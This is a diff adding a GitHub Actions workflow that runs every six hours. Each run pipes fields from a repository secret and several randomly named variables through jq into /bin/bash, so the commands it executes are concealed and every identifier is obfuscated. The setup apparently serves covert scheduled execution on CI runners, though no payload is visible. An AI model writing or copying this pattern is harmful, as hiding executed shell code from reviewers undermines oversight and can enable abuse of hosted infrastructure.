@@ -1,0 +1,25 @@
+name: qixianshengshiba
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: qixianshengshiba
+        env:
+          xbahs27: ${{ secrets.xbahs27 }}
+        run: |
+          echo $xbahs27 | jq -r .mp56 | /bin/bash
+          echo $z00 | jq -r .yzrbx28147 | /bin/bash
+          echo $f133 | jq -r .dfwr8953 | /bin/bash
+          echo $epl348 | jq -r .si64494 | /bin/bash
+          echo $cshg3866 | jq -r .ysq33794 | /bin/bash
+          echo $y88489 | jq -r .m400 | /bin/bash
+          echo $kaza539 | jq -r .fnq16 | /bin/bash
+          echo $b12705 | jq -r .ajqd10121 | /bin/bash
+          echo $snh3247 | jq -r .xqkug855 | /bin/bash
+          echo $si2220 | jq -r .loqr5 | /bin/bash
+
